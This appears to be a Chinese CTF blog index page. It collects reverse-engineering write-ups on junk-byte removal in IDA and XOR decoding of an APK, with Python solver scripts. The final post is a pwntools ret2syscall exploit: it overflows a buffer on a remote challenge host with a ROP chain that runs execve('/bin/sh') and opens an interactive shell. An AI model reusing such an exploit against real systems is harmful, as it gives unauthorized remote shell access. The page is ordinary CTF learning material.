      <a class="article-title" href="/2023/09/23/re%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
        re做题记录
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Captain_RB/article/details/123858864">花指令总结_Captain_RB的博客-CSDN博客</a></p>
<h2 id="NSSRound-3-Team-jump-by-jump"><a href="#NSSRound-3-Team-jump-by-jump" class="headerlink" title="[NSSRound#3 Team]jump_by_jump"></a>[NSSRound#3 Team]jump_by_jump</h2><p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2313">NSSRound#3 Team]jump_by_jump | NSSCTF</a></p>
<p>为什么记录这个题目时因为他有花指令，是最简单的花指令</p>
<p>首先我们使用ida打开，我们可以看到他的主函数里调用了flag函数，但是不显示，我们切换视图发现是有花指令导致他无法编译</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.l5jcce610eo.webp"></p>
<p>我们看到他的特征就想到了多字节指令，我们在41188C(call或者jmp等等跳转函数)处，摁D将其转换成数据，将E8 nop 掉</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6qkaosh9hjk0.webp"></p>
<p>同时我们发现有很多变成了黄色的代码，我们一路对这些黄色的代码摁c将其转换成代码，最后我们可以选中全部的代码，摁d转换成数据，摁c转换成代码，最后摁p再编译成函数，就去掉了这类最简单的花指令，在函数内我们就发现了flag</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3x3dpjarkq60.webp"></p>
<h2 id="HNCTF-2022-WEEK2-e-sy-flower"><a href="#HNCTF-2022-WEEK2-e-sy-flower" class="headerlink" title="[HNCTF 2022 WEEK2]e@sy_flower"></a>[HNCTF 2022 WEEK2]e@sy_flower</h2><p>第二个简单的去花题目</p>
<p>找到主函数后发现有花的地方</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.44rklresz740.webp"></p>
<p>我们在这里找到了花指令的地方，我们直接右击选择patching-&gt;change byte</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.50qing3en4o0.webp"></p>
<p>我们把E9-&gt;90 ,把E9nop掉，然后在main上p一下编译函数就可以了</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4saybtma0gs0.webp"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v3; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+0h] [ebp-44h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [esp+0h] [ebp-44h]</span></span><br><span class="line">  <span class="type">char</span> Arglist[<span class="number">48</span>]; <span class="comment">// [esp+10h] [ebp-34h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401020(<span class="string">&quot;please input flag\n&quot;</span>, v8);</span><br><span class="line">  sub_401050(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)Arglist);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(Arglist);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v3 / <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = Arglist[<span class="number">2</span> * i];</span><br><span class="line">    Arglist[<span class="number">2</span> * i] = Arglist[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">    Arglist[<span class="number">2</span> * i + <span class="number">1</span>] = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(Arglist); ++j )</span><br><span class="line">    Arglist[j] ^= <span class="number">0x30</span>u;</span><br><span class="line">  v7 = <span class="built_in">strcmp</span>(Arglist, <span class="string">&quot;c~scvdzKCEoDEZ[^roDICUMC&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">    v7 = v7 &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401020(<span class="string">&quot;yes&quot;</span>, v9);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401020(<span class="string">&quot;error&quot;</span>, v9);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们分析代码就可以知道，我们已知了加密后的代码，先异或回数据，然后根据前面的替换</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3qj9ibdwap80.webp"></p>
<p>然后根据上面解出来的数据再写代码进行替换位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;SNCSFTJ&#123;su_tujknB_tyse&#125;s&#x27;</span></span><br><span class="line">secret=<span class="built_in">list</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">12</span>):</span><br><span class="line">  deme=secret[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">  secret[<span class="number">2</span>*i+<span class="number">1</span>] = secret[<span class="number">2</span>*i]</span><br><span class="line">  secret[<span class="number">2</span>*i]=deme</span><br><span class="line"></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span>.join(secret)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># NSSCTF&#123;Just_junk_Bytess&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2021-新生赛-easyapp"><a href="#SWPUCTF-2021-新生赛-easyapp" class="headerlink" title="[SWPUCTF 2021 新生赛]easyapp"></a>[SWPUCTF 2021 新生赛]easyapp</h2><p>首先先把附件改成zip后缀进行解压，解压完成后直接使用jadx打开直接找到主函数进行分析</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.5lfec6bnq680.webp"></p>
<p>我们可以看到这段是主要的函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="comment">/* synthetic */</span> <span class="keyword">void</span> lambda$onCreate$<span class="number">0</span>$MainActivity(<span class="keyword">final</span> EditText editText, View v) &#123;</span><br><span class="line">        System.out.println(encoder.encode(editText.getText().toString()));</span><br><span class="line">        <span class="keyword">if</span> (encoder.encode(editText.getText().toString()).equals(<span class="string">&quot;棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌&quot;</span>)) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;YES&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;NO&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>前面引进了两个函数，我们挨个查看一下</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1cftb7q0szxc.webp"></p>
<p>我们可以看到第一个加密函数，使用了key为123456789，然后和输入的内容进行异或</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ilililililil;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Encoder</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">key</span> <span class="operator">=</span> <span class="number">123456789</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">encode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : str.toCharArray()) &#123;</span><br><span class="line">            sb.append((<span class="type">char</span>) (c ^ <span class="built_in">this</span>.key));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看一下下一个函数。这里就是一个坑，他把第一个函数中的key值改成了987654321，所以后面异或的key为987654321</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ilililililil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActlvity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainActlvity</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> Encoder.class.getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">            declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            declaredField.set(MainActivity.encoder, <span class="number">987654321</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException | NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>到现在我们已经知道了异或的key以及密文，所以我们就可以直接写脚本解题目了</p>
<p>当然注意一个很关键的地方因为他的apk使用的unicode编码，但我们ascii码的表示范围是0x0-0xFF，所以到最后我们需要异或一个255或者0xff表示范围</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="string">&#x27;棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌&#x27;</span></span><br><span class="line">key = <span class="number">987654321</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">  flag+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(i)^key)%<span class="number">128</span>) <span class="comment">#确定在0~128</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># NSSCTF&#123;apkYYDS&#125;</span></span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/re/" rel="tag">re</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-web入门记录" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/09/21/web%E5%85%A5%E9%97%A8%E8%AE%B0%E5%BD%95/" class="article-date">
  	<time datetime="2023-09-21T05:45:27.000Z" itemprop="datePublished">2023-09-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/09/21/web%E5%85%A5%E9%97%A8%E8%AE%B0%E5%BD%95/">
        web入门记录
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/202308172151534.jpg"></p>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
        <p class="article-more-link">
          <a  href="/2023/09/21/web%E5%85%A5%E9%97%A8%E8%AE%B0%E5%BD%95/#more">learn more >></a>
        </p>
      
    
  </div>
  
</article>







  
    <article id="ew-litctf" class="article article-type-ew" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/09/19/litctf/" class="article-date">
  	<time datetime="2023-09-19T08:45:20.000Z" itemprop="datePublished">2023-09-19</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/09/19/litctf/">
        litctf
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="LitCTF-2023-我Flag呢？"><a href="#LitCTF-2023-我Flag呢？" class="headerlink" title="[LitCTF 2023]我Flag呢？"></a>[LitCTF 2023]我Flag呢？</h2><p>打开环境后，直接F12就可以看到flag</p>
<p>同时打开源码的方式还有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f12/ctrl+u/view-source：</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/%7B4038CD4C-5AD6-45cc-B79F-734765D74244%7D.74m3u0jfzps0.webp"></p>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RE/" rel="tag">RE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/" rel="tag">WEB</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/litctf/" rel="tag">litctf</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
        <p class="article-more-link">
          <a  href="/2023/09/19/litctf/#more">learn more >></a>
        </p>
      
    
  </div>
  
</article>







  
    <article id="post-山石结营赛" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/08/20/%E5%B1%B1%E7%9F%B3%E7%BB%93%E8%90%A5%E8%B5%9B/" class="article-date">
  	<time datetime="2023-08-19T16:15:19.000Z" itemprop="datePublished">2023-08-20</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/08/20/%E5%B1%B1%E7%9F%B3%E7%BB%93%E8%90%A5%E8%B5%9B/">
        山石结营赛
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;58.240.236.231&#x27;</span>,<span class="number">49003</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x40072b</span></span><br><span class="line">rsi = <span class="number">0x400735</span></span><br><span class="line">rax = <span class="number">0x400721</span></span><br><span class="line">syscall = <span class="number">0x400741</span></span><br><span class="line">rdx = <span class="number">0x40073f</span></span><br><span class="line">binsh = <span class="number">0x601048</span></span><br><span class="line">payload = <span class="number">0x48</span>*<span class="string">b&#x27;a&#x27;</span>+ p64(rax) + p64(<span class="number">59</span>) + p64(rdi) + p64(<span class="number">0x601048</span>) + p64(rsi) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/write-up/" rel="tag">write up</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
        <p class="article-more-link">
          <a  href="/2023/08/20/%E5%B1%B1%E7%9F%B3%E7%BB%93%E8%90%A5%E8%B5%9B/#more">learn more >></a>
        </p>
      
    
  </div>
  
</article>







  
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2023 wuming
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: false,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




  </div>
</body>
</html>